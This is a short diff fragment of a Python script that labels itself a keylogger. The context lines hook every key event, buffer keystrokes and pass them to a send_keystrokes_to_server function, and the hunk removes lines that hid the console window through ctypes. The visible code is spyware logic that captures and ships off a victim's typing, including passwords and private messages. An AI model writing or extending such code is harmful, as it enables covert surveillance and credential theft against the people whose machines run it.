@@ -31,9 +31,6 @@ def on_key_event(event):
             send_keystrokes_to_server(data_to_send)
             keystrokes = []  # Reset after sending
 
-# Hide the console window
-ctypes.windll.kernel32.FreeConsole()
-
 # Start the keylogger
 try:
     keyboard.hook(on_key_event)  # Hook the key event
